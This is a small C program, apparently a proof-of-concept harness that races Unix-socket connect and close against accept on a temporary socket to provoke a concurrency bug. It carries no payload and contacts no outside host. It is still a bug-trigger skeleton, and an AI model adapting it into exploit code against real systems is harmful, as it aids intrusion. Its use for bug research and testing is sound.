#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <pthread.h>

int server_fd;
volatile int stop = 0;

void *client_thread(void *arg)
{
    int fd, ret;
    struct sockaddr_un addr;
    
    while (!stop) {
        fd = socket(AF_UNIX, SOCK_STREAM, 0);
        if (fd < 0) continue;
        
        memset(&addr, 0, sizeof(addr));
        addr.sun_family = AF_UNIX;
        strncpy(addr.sun_path, "/tmp/poc_close.sock", sizeof(addr.sun_path) - 1);
        
        ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        if (ret >= 0) {
            close(fd);
        }
    }
    return NULL;
}

int main(void)
{
    int ret, i;
    struct sockaddr_un addr;
    pthread_t t;
    
    unlink("/tmp/poc_close.sock");
    
    server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); return 1; }
    
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, "/tmp/poc_close.sock", sizeof(addr.sun_path) - 1);
    
    ret = bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("bind"); return 1; }
    
    ret = listen(server_fd, 128);
    if (ret < 0) { perror("listen"); return 1; }
    
    printf("[+] Server listening\n");
    
    pthread_create(&t, NULL, client_thread, NULL);
    
    for (i = 0; i < 500; i++) {
        struct timeval tv = {0, 500};
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(server_fd, &rfds);
        
        if (select(server_fd + 1, &rfds, NULL, NULL, &tv) > 0) {
            int afd = accept(server_fd, NULL, NULL);
            if (afd >= 0) {
                close(afd);
            }
        }
    }
    
    stop = 1;
    pthread_join(t, NULL);
    
    printf("[+] Done\n");
    
    close(server_fd);
    unlink("/tmp/poc_close.sock");
    
    return 0;
}
